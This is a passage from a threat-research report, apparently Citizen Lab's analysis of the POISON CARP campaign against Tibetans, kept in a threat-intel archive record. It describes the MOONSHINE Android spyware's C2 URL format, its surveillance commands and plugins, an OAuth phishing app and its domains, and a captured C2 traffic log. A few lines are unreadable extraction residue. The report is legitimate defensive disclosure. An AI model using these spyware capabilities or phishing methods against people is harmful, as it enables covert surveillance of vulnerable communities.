URL:\n```\nws://[MoonshineSite]:10011/ws?whisky_id=[sha256]&device_id=[sha256]&error=0 .\n\n```\nScotch provides some basic espionage capabilities out of the box, but it downloads plugins from the C2 server to augment its functionality. The\nbasic C2 commands available in Scotch’s initial state are:\n\nDEV_INFO: Get detailed information on the device (SIM Card information, hardware, sensors)\nGET_FILE: Upload a file from the phone\nGET_PLUGIN_INFO: Install additional plugins\n\nWhen we infected our test device with Scotch, it was immediately updated with two new plugin bundles in DEX format: `Bourbon.jar and`\n```\nIceCube.jar . The Bourbon.jar plugin package added the following functionality:\n\n```\n\n-----\n\nG _C OG ac p o e ca s ece ed by t e p o e\nGET_CONTACT: List and track contacts added on the phone\nGET_FILE: A more advanced version of the built-in GET_FILE command to upload and download files\nGET_LOCATION: Track the phone’s location, including through GPS\nGET_SMS: Track SMS messages received by the phone\n\nThe IceCube.jar plugin package added further functionality:\n\nCAMERA: List available cameras and take pictures\nNOTIFICATION: Show a notification on the phone\nRECORD: Record audio from the microphone\nSCREEN_SNAP: Take screenshots\nSHELL: Execute a shell command\n\nThe implant and C2 communicated using JSON formatted messages which were compressed using GZIP and then Base64 encoded prior to\ntransmission via WebSocket. After capturing network traffic between our infected device and the C2 server, we were able to decode and\nobserve the communication pattern. An example of this traffic is provided in Appendix A.\n\nDuring analysis of MOONSHINE websites, we discovered two distinct login pages that may be used to manage implants and exploits.\nScreenshots of these interfaces are shown in Figure 13. ScotchManager was hosted on port 9090, and VodkaManager was hosted on port\n8080.\n\nFigure 13: Suspected MOONSHINE management interfaces.\nAlthough one of these panels carries the name VodkaManager, we did not uncover any specific module or component of MOONSHINE that\nused the name “Vodka”.\n\n## Summary\n\nWe believe that the discovery of this Android exploit and spyware kit we dubbed MOONSHINE represents a previously undocumented\nespionage tool. Its multi-stage installation approach along with its persistence via shared object library hijacking both suggest a high degree of\noperational security awareness and skilled development.\n\n## 4. Malicious OAuth Application\n\n[Open Authentication (OAuth) is a protocol designed for access delegation and has become a popular way for major platforms (e.g., Facebook,](https://en.wikipedia.org/wiki/OAuth)\nGoogle, Twitter, etc.) to permit sharing of account information with third party applications.\n\n[Malicious OAuth applications have been used in phishing attacks both in digital espionage operations and generic cybercrime. Recently, we](https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/)\n[have also seen campaigns using malicious OAuth applications targeting the Tibetan community, perhaps in an effort to phish users who take](https://citizenlab.ca/2018/01/spying-on-a-budget-inside-a-phishing-operation-with-targets-in-the-tibetan-community/#part3)\nadvantage of two-factor authentication to secure their Google accounts.\n\nOn May 31, 2019, a member of the Tibetan Parliament received a WhatsApp message requesting confirmation of a news story (Figure 14).\nThe same individual previously was sent iOS exploit links in a WhatsApp message in November 2018. The message included two Bitly links.\nThe first short link sent in the message extended to `hxxps://www.energy-mail[.]org/B20V54, which redirected to a Google OAuth`\napplication called Energy Mail that requests access to Gmail data (Figure 15). After subsequent clicks, the link simply redirected to a\nlegitimate Google login page. The second `bit.ly link served MOONSHINE, leading us to determine that these OAuth attacks are carried`\nout by the same operator as the mobile exploitation activity.\n\n\n-----\n\nFigure 14: Two malicious links received by member of Tibetan Parliament.\nWhen we visited `www.energy-mail[.]org in a web browser, we were presented with a decoy page for a mail app called “Energy Mail” that`\npurported to be “a free email application with simple configuration and free customization” supporting “Gmail, Outlook, Hotmail, Yahoo, Tencent\nbusiness, Sina, Netease, and many more.” This decoy page may have been designed to convince someone vetting the OAuth app that it\nserved a legitimate purpose.\n\n\n-----\n\nFigure 15 : Authorization screen for the “Energy Mail” account phishing application.\nWe identified the following websites that appeared to be used by the same operator, based on similarity of decoy pages and by using Passive\nDNS data from [RiskIQ:](https://community.riskiq.com/)\n```\nantmoving[.]online\nbeemail[.]online\nbf[.]mk\nenergy-mail[.]org\ngmailapp[.]me\nizelense[.]com\nmailanalysis[.]services\nmailcontactanalysis[.]online\nmailnotes[.]online\npolarismail[.]services\nrf[.]mk\nwalkingnote[.]online\n\n```\nDecoy pages and OAuth applications contained the following contact information:\n```\nantmoving.online@gmail.com\nenergymail.org@gmail.com\njameslewis199106@gmail.com\ntouchxun658@gmail.com\n+852 65891393\n\n```\nWe found the following WHOIS data shared among some of these sites:\n```\ne-mail: dashenqu832@outlook.com\ne-mail: ornaments798@outlook.com\n\n## 5. Conclusion\n\n```\n\n-----\n\nO e o t e s g ca t d gs o ou a a ys s s t e co ect o bet ee O SO C a d t e ca pa g s epo ted by Goog e oject e o\nand Volexity. Based on the use of the same iOS exploits and similar iOS spyware implant between POISON CARP and the campaign\ndescribed by Google Project Zero and server infrastructure connections with the Evil Eye campaign reported by Volexity, we determine that the\nthree campaigns were likely conducted by the same operator or a closely coordinated group of operators who share resources.\n\nBeyond the technical overlap in these campaigns is the fact that they all targeted ethnic minority groups related to China: Uyghurs and\n[Tibetans. These communities have experienced digital espionage threats for over a decade and previous](https://unit42.paloaltonetworks.com/scarlet-mimic-years-long-espionage-targets-minority-activists/) [reports often find the same operators](https://securelist.com/android-trojan-found-in-targeted-attack-58/35552/)\nand malware tool kits targeting them. However, the level of threat posed by POISON CARP and the linked campaigns are a game changer.\nThese campaigns are the first documented cases of iOS exploits and spyware being used against these communities.\n\nOver the years, Tibetan groups have become savvy to the signs of suspicious emails, attachments, and phishing. However, POISON CARP\nshows that mobile threats are not expected by the community, as evidenced by the high click rate on the exploit links that would have resulted\nin significant compromise if the devices were running vulnerable versions of iOS or Android. Part of the success of the social engineering used\nby POISON CARP is likely due to the effort made to make targeted individuals feel comfortable through the extended chat conversations and\nfake personas. This intimate level of targeting is easier to achieve on mobile chat apps than through email.\n\nThe targeting of mobile platforms also reflects a general pattern we have seen in information security threats to civil society around the world.\n[Numerous reports show the products of commercial spyware vendors who sell services exclusively to governments being used to spy on](https://citizenlab.ca/tag/nso-group/)\nactivists and journalists through their iOS and Android devices. These incidents demonstrate a growing demand for exploitation of mobile\ndevices. From an adversary perspective what drives this demand is clear. It is on mobile devices that we consolidate our online lives and that\ncivil society organizes and mobilizes. A view inside a phone can give a view inside these movements.\n\nAddressing these threats requires action from within civil society and private industry. Efforts such as [TibCERT are important steps forward in](https://tibcert.org/)\nincreasing the digital security of Tibetan organisations and can serve as examples for other civil society communities. By adopting procedures,\nnorms, and frameworks used by government and private industry such as CERTs, civil society can mature efforts to share incident response\nresources and data on threats. At the same time, platform providers should pay special attention to threats deployed against civil society. Not\nonly are civil society users at heightened risk of negative consequences from digital espionage, but the surveillance tools developed and\nhoned with the unwitting aid of civil society targets put all users at risk.\n\n## Acknowledgements\n\nThis report is a collaboration with the Tibetan Computer Emergency Readiness Team (TibCERT). Special thanks to the TNG & Tommy.\n\n## Indicators of Compromise\n\n[Indicators of compromise are available on our GitHub page in multiple formats.](https://github.com/citizenlab/malware-indicators)\n\n## Appendix A: MOONSHINE – Scotch Command and Control Traffic\n\nThe following is a rendered view of network communication we captured between our Android test device infected with the Scotch implant and\nthe command and control server. Data in italics denotes information which has been redacted.\n\n\n-----\n\n```\n=================================================================================================\nSERVER -> CLIENT : ONLINE | SUCCESS -> [{'target_id': <int>}]\nSERVER -> CLIENT : DEV_INFO | SUCCESS -> [{}]\nCLIENT -> SERVER : DEV_INFO | SUCCESS ->\n[{'board_name': 'unknown',\n'cpu_corenum': 1,\n'cpu_maxfreq': '',\n'cpu_minfreq': '',\n'cpu_curfreq': 'N/A',\n'cpu_feature': 'swp half thumb fastmult vfp edsp neon \nvfpv3 tls vfpv4 idiva idivt vfpd32 evtstrm',\n'cpu_hardware': 'Dummy Virtual Machine',\n'cpu_arch': '7',\n'product': 'sdk_phone_armv7',\n'model': 'sdk_phone_armv7',\n'sdk': '6.0',\n'sdk_int': 23,\n'imei': '00000000000000',\n'hardware': 'ranchu',\n'radio_version': '',\n'brand': 'Android',\n'rom': 'unknown',\n'system_version': '6.0',\n'linux_version': 'Linux version 3.10.0+ (jinqian@jinqian.mtv.corp.google.com) \n(gcc version 4.9 20150123 (prerelease) (GCC) ) \n#99 SMP PREEMPT Tue May 17 18:35:11 PDT 2016\\nay 17 18:35:11 P',\n'display': 'sdk_phone_armv7-userdebug 6.0 MASTER 3079352 test-keys',\n'host': 'vpeb14.mtv.corp.google.com',\n'language': 'en-US',\n'host_app_label': 'Loader',\n'host_app_version_name': '1.0',\n'host_app_version_code': 1,\n'host_app_package_name': 'com.facebook.katana',\n'host_app_path': '/data/data/com.facebook.katana',\n'real_resolution': '1440 * 2880',\n'resolution': '1440 * 2712',\n'densitydpi': 560,\n'sensor': ['Goldfish 3-axis Accelerometer', 'Goldfish 3-axis Magnetic field sensor', \n'Goldfish Orientation sensor', 'Goldfish Temperature sensor', \n'Goldfish Proximity sensor', 'Goldfish Light sensor', \n'Goldfish Pressure sensor', 'Goldfish Humidity sensor'],\n'simcard': [],\n'packageInfo': [\n{'name': 'com android smoketest' 'version': '6 0 3079352' 'install time': 1469048094000}\n\n```\n\n-----\n\n```\n{'name': 'com.example.android.apis', 'version': '6.0-3079352', 'install_time': 1469048339000}, \n{'name': 'com.facebook.katana', 'version': '1.0', 'install_time': 1564653617080}, \n{'name': 'com.android.gesture.builder', 'version': '6.0-3079352', 'install_time': 1469048289000}, \n{'name': 'com.android.smoketest.tests', 'version': '6.0-3079352', 'install_time': 1469048094000}, \n{'name': 'com.example.android.softkeyboard', 'version': '6.0-3079352', 'install_time': 1469048288000}, \n{'name': 'com.android.widgetpreview', 'version': '6.0-3079352', 'install_time': 1469048289000}\n]\n}]\nSERVER -> CLIENT : GET_PLUGIN_INFO | SUCCESS ->\n[{'plugins':\n[\n{'name': 'bourbon.jar', 'version': '0.1.0708.39', 'hash': '<sha256 hash>'},\n{'name': 'icecube.jar', 'version': '0.1.0708.39', 'hash': '<sha256 hash>'}\n]\n}]\nCLIENT -> SERVER : GET_PLUGIN_INFO | SUCCESS -> []\nSERVER -> CLIENT : GET_SMS | SUCCESS -> [{'subcmd': 2}]\nCLIENT -> SERVER : GET_SMS | COMMAND_TYPE_NOT_REGISTERED -> []\nSERVER -> CLIENT : GET_LOCATION | SUCCESS -> [{'subcmd': 2}]\nCLIENT -> SERVER : GET_LOCATION | COMMAND_TYPE_NOT_REGISTERED -> []\nSERVER -> CLIENT : GET_CONTACT | SUCCESS -> [{'subcmd': 2}]\nCLIENT -> SERVER : GET_CONTACT | COMMAND_TYPE_NOT_REGISTERED -> []\nSERVER -> CLIENT : GET_CALLLOG | SUCCESS -> [{'subcmd': 2}]\nCLIENT -> SERVER : GET_CALLLOG | COMMAND_TYPE_NOT_REGISTERED -> []\nCLIENT -> SERVER : GET_PLUGIN_INFO | SUCCESS -> []\nSERVER -> CLIENT : GET_SMS | SUCCESS -> [{'subcmd': 2}]\nSERVER -> CLIENT : GET_LOCATION | SUCCESS -> [{'subcmd': 2}]\nSERVER -> CLIENT : GET_CONTACT | SUCCESS -> [{'subcmd': 2}]\nSERVER -> CLIENT : GET_CALLLOG | SUCCESS -> [{'subcmd': 2}]\nCLIENT -> SERVER : GET_SMS | PERMISION_NOT_GRANTED -> []\nCLIENT -> SERVER : GET_LOCATION | PERMISION_NOT_GRANTED -> []\nCLIENT -> SERVER : GET_CONTACT | PERMISION_NOT_GRANTED -> []\nCLIENT -> SERVER : GET_CALLLOG | PERMISION_NOT_GRANTED -> []\n\n```\n1. In a statement released on September 6, 2019 Apple confirmed that the iOS campaign targeted Uyghur websites:\n\n_[https://www.apple.com/newsroom/2019/09/a-message-about-ios-security/↩](https://www.apple.com/newsroom/2019/09/a-message-about-ios-security/)_\n2. Kang credits Guang Gong (@oldfresher) of Qihoo 360 Alpha Team and Wen Xu (@antlr7) of KeenTeam for discovering the exploit.↩\n\n## Media Mentions\n\n[Reuters,](https://www.reuters.com/article/us-china-cyber-tibetans/chinese-hackers-who-pursued-uighurs-also-targeted-tibetans-researchers-idUSKBN1W90XN) [Vice,](https://www.vice.com/en_us/article/a357b5/hackers-tried-to-compromise-phones-of-tibetans-working-for-dalai-lama) [Forbes,](https://www.forbes.com/sites/thomasbrewster/2019/09/24/whatsapp-fakes-hack-tibetan-iphones-and-androids-to-steal-facebook-data-and-more/#31bc93a3713d) [Forbes Israel,](http://www.forbes.co.il/news/new.aspx?Pn6VQ=J&0r9VQ=EKEMH) [Forbes France,](https://www.forbes.fr/technologie/comment-les-chinois-hackent-les-smartphones-de-personnalites-tibetaines/) [TechCrunch,](https://techcrunch.com/2019/09/24/tibetans-iphone-android-hacks-uyghurs/) [Wired,](https://www.wired.com/story/doordash-breach-notpetya-fedex-security-roundup/) [Cyber Scoop,](https://www.cyberscoop.com/tibet-citizen-lab-spyware-espionage/) [Boing Boing,](https://boingboing.net/2019/09/24/one-click-attacks.html) [ICT Kommunikation,](https://ictk.ch/inhalt/chinesische-hacker-griffen-angeblich-exil-tibeter) [SC Media,](https://www.scmagazine.com/home/security-news/apts-cyberespionage/poison-carp-cyberespionage-group-targeting-tibetan-officials-with-mobile-malware/) the\nLogic, [Business Insider,](https://www.businessinsider.in/the-iphones-and-android-phones-of-tibetan-activists-were-targeted-by-hackers-pretending-to-work-for-amnesty-international/articleshow/71281769.cms) [Information Security Newspaper,](https://www.securitynewspaper.com/2019/09/24/see-how-one-click-mobile-exploits-targets-tibetans/) [Satoshi Nakamoto Blog (2),](https://www.satoshinakamotoblog.com/1-click-iphone-and-android-exploits-target-tibetan-users-via-whatsapp) [Liberty Times Net,](https://news.ltn.com.tw/news/world/breakingnews/2925621) [Tibet Times,](http://tibettimes.net/2019/09/24/180568/) [Fooshya,](https://fooshya.com/2019/09/24/whatsapp-fakes-hack-tibetan-iphones-and-androids-to-steal-fb-knowledge-and-extra/) [Kursk Izvestia,](http://kursk-izvestia.ru/news/144198/)\n[Boxun,](https://www.boxun.com/news/gb/china/2019/09/201909250737.shtml) [PC Mag,](https://au.pcmag.com/news/63650/iphone-hackers-who-spied-on-uighurs-also-targeted-tibetans) [Bald News,](https://www.bald-news.com/culture/8236639/%D8%A8%D9%86%D9%82%D8%B1%D8%A9-%D9%88%D8%A7%D8%AD%D8%AF%D8%A9-%D8%B9%D9%84%D9%89-%D9%88%D8%A7%D8%AA%D8%B3%D8%A7%D8%A8-%D9%87%D9%88%D8%A7%D8%AA%D9%81-%D8%A3%D9%86%D8%AF%D8%B1%D9%88%D9%8A%D8%AF-%D9%88%D8%A2%D9%8A%D9%81%D9%88%D9%86-%D8%AA%D8%AA%D8%B9%D8%B1%D8%B6-%D9%84%D9%84%D8%A7%D8%AE%D8%AA%D8%B1%D8%A7%D9%82) [Novost IT,](https://novostit.com/kiberprestupniki-atakovali-ofis-dalaj-lamy-s-pomoshhyu-ssylki-v-whatsapp.html) [Ars Technica,](https://arstechnica.com/information-technology/2019/09/attackers-used-one-click-exploits-to-target-tibetans-ios-and-android-phones/) [Next Web,](https://thenextweb.com/security/2019/09/25/mobile-malware-campaign-targeting-uyghur-muslims-impacted-tibetans-too/) [Koran Sindo,](http://koran-sindo.com/page/news/2019-09-26/0/26/Peretas_China_Targetkan_Warga_Tibet_dan_Uighur) [Web India,](https://news.webindia123.com/news/Articles/India/20190925/3605789.html) [Security Week,](https://www.securityweek.com/poison-carp-threat-actor-targets-tibetan-groups) [Big AZ,](https://big.az/369435-whatsapp_isledenlerin_nezerine_danisiq_ve_yazismalariniz_izlenile_biler.html) [Cyber Wire,](https://www.thecyberwire.com/issues/issues2019/September/CyberWire_2019_09_25.html) La Nouvelle\nTribune, [ZPN,](https://zpn.ro/hackerii-chinezi-care-au-urmarit-uigurii-au-vizat-si-tibetanii-cercetatori-securitate-software-telco-isp/) [Nieuw Space,](http://www.nieuw.space/post?id=5998043) [USA News Hub,](http://www.allusanewshub.com/2019/09/25/the-cybersecurity-202-white-house-blocking-congress-from-auditing-its-offensive-hacking-strategy/) [Live Door,](https://news.livedoor.com/article/detail/17137032/) [USA Science News,](https://usa-sciencenews.com/2019/09/25/inside-the-campaign-that-tried-to-compromise-tibetans-ios-and-android-phones/) [Security.nl,](https://www.security.nl/posting/625473/Tibetaanse+groepen+doelwit+van+1-click+Android-+en+iOS-exploits) [News Headline,](https://thenewsheadline.com/attackers-used-one-click-exploits-to-target-tibetans-ios-and-android-phones/) [PC News,](https://pcnews.ru/news/hakery_naucilis_vzlamyvat_smartfony_cerez_whatsapp-927113.html) [the Quint,](https://www.thequint.com/news/hot-news/chinese-hackers-target-tibetans-close-to-dalai-lama) [Mobi Guru,](https://mobiguru.ru/news/art/22570.html)\n[News 18,](https://www.news18.com/news/tech/whatsapp-is-being-used-by-hackers-to-target-tibetans-2322789.html) [Boan News,](https://www.boannews.com/media/view.asp?idx=83259) [Austrian Economics Blog,](https://austrian.economicblogs.org/zerohedge/2019/durden-china-linked-hackers-targetnbsptibetan-activists-smartphones-spoofing-amnesty-international-officials/) [Phayul,](http://www.phayul.com/news/article.aspx?id=41796&article=Members+of+CTA%2c+civil+society+targeted+by+one-click+mobile+exploits%3a+research) [Foreign Policy,](https://foreignpolicy.com/2019/09/26/security-brief-plus-trading-missiles-for-favors/) [Defence Web,](https://www.defenceweb.co.za/cyber-defence/chinese-uighur-hackers-also-went-after-tibetans/) [VAR India,](https://www.varindia.com/news/oneclick-away-on-your-ios-and-android-phones-with-just-one-whatsapp-click) [Globo,](https://g1.globo.com/economia/tecnologia/blog/altieres-rohr/post/2019/09/27/com-link-via-whatsapp-hackers-espionaram-celulares-de-liderancas-do-tibete.ghtml) [App Marsh,](https://www.appmarsh.com/start-up-no-1154-ai-scientific-analysis-as-just-right-as-human-amazons-new-iot-protocol-5gs-warmth-drawback-wepaintings-objectives-to-promote-three-companies-and-extra/) [UDN,](https://udn.com/news/story/7331/4075392) [Maestroviejo,](https://maestroviejo.es/netizen-report-protestas-contra-la-corrupcion-en-egipto-desencadenan-bloqueos-de-internet-y-arrestos/)\n[Daily Heralds](https://dailyheralds.org/market/doordash-breach-exposes-data-49-million-customers-84600420)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-09-24 - Missing Link Tibetan Groups Targeted with 1-Click Mobile Exploits.pdf"
    ],
    "report_names": [
        "2019-09-24 - Missing Link Tibetan Groups Targeted with 1-Click Mobile Exploits.pdf"
    ],
    "threat_actors": [
        {
            "id": "8c5c318c-0e71-4184-92bb-d1c28f68a411",
            "created_at": "2022-10-25T15:50:23.692481Z",
            "updated_at": "2025-03-27T02:00:55.525121Z",
            "deleted_at": null,
            "main_name": "Scarlet Mimic",
            "aliases": [
                "Scarlet Mimic"
            ],
            "source_name": "MITRE:Scarlet Mimic",
            "tools": [
                "Psylo",
                "MobileOrder",
                "CallMe",
                "FakeM"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f0ebaf6d-5e1a-4ed7-aa2c-0e69a648acea",
            "created_at": "2022-10-25T16:07:23.597455Z",
            "updated_at": "2025-03-27T02:02:09.881507Z",
            "deleted_at": null,
            "main_name": "Evil Eye",
            "aliases": [],
            "source_name": "ETDA:Evil Eye",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3cc6c262-df23-4075-a93f-b496e8908eb2",
            "created_at": "2022-10-25T16:07:23.682239Z",
            "updated_at": "2025-03-27T02:02:09.920109Z",
            "deleted_at": null,
            "main_name": "GhostNet",
            "aliases": [
                "GhostNet",
                "Snooping Dragon"
            ],
            "source_name": "ETDA:GhostNet",
            "tools": [
                "AngryRebel",
                "Farfli",
                "Gh0st RAT",
                "Gh0stnet",
                "Ghost RAT",
                "Ghostnet",
                "Moudour",
                "Mydoor",
                "PCRat",
                "Remosh",
                "TOM-Skype"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9fc2aed1-c838-41e9-b469-922e7bab6f94",
            "created_at": "2022-10-25T16:07:24.162936Z",
            "updated_at": "2025-03-27T02:02:10.128098Z",
            "deleted_at": null,
            "main_name": "Scarlet Mimic",
            "aliases": [
                "Golfing Taurus"
            ],
            "source_name": "ETDA:Scarlet Mimic",
            "tools": [
                "BrutishCommand",
                "CallMe",
                "CrypticConvo",
                "Elirks",
                "FakeFish",
                "FakeHighFive",
                "FakeM",
                "FakeM RAT",
                "FullThrottle",
                "HTran",
                "HUC Packet Transmit Tool",
                "MobileOrder",
                "Psylo",
                "RaidBase",
                "SkiBoot",
                "SubtractThis",
                "Terminator RAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e91dae30-a513-4fb1-aace-4457466313b3",
            "created_at": "2023-01-06T13:46:38.974913Z",
            "updated_at": "2025-03-27T02:00:02.967085Z",
            "deleted_at": null,
            "main_name": "GhostNet",
            "aliases": [
                "Snooping Dragon"
            ],
            "source_name": "MISPGALAXY:GhostNet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cac03bbf-0c42-470d-951e-0e92656be6cb",
            "created_at": "2023-01-06T13:46:38.463275Z",
            "updated_at": "2025-03-27T02:00:02.840123Z",
            "deleted_at": null,
            "main_name": "Scarlet Mimic",
            "aliases": [
                "G0029",
                "Golfing Taurus"
            ],
            "source_name": "MISPGALAXY:Scarlet Mimic",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d2a5c949-7ae0-4610-8bb8-047ab03b1574",
            "created_at": "2022-10-25T16:07:24.064197Z",
            "updated_at": "2025-03-27T02:02:10.096487Z",
            "deleted_at": null,
            "main_name": "Poison Carp",
            "aliases": [
                "Earth Empusa",
                "Evil Eye",
                "EvilBamboo",
                "Poison Carp",
                "Red Dev 16"
            ],
            "source_name": "ETDA:Poison Carp",
            "tools": [
                "ActionSpy",
                "AxeSpy",
                "BADSIGNAL",
                "BADSOLAR",
                "BadBazaar",
                "IRONSQUIRREL",
                "IceCube",
                "MOONSHINE",
                "PoisonCarp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "52973e5f-9656-4b60-b7f8-457e32ac4bbe",
            "created_at": "2023-01-06T13:46:39.056888Z",
            "updated_at": "2025-03-27T02:00:02.986693Z",
            "deleted_at": null,
            "main_name": "POISON CARP",
            "aliases": [
                "Evil Eye",
                "Red Dev 16",
                "Earth Empusa"
            ],
            "source_name": "MISPGALAXY:POISON CARP",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535672,
    "ts_updated_at": 1743041788,
    "ts_creation_date": 1653752407,
    "ts_modification_date": 1653752407,
    "files": {
        "pdf": "https://archive.orkl.eu/9c8a682b5d2178909f26603d78ad8d2c19747496.pdf",
        "text": "https://archive.orkl.eu/9c8a682b5d2178909f26603d78ad8d2c19747496.txt",
        "img": "https://archive.orkl.eu/9c8a682b5d2178909f26603d78ad8d2c19747496.jpg"
    }
}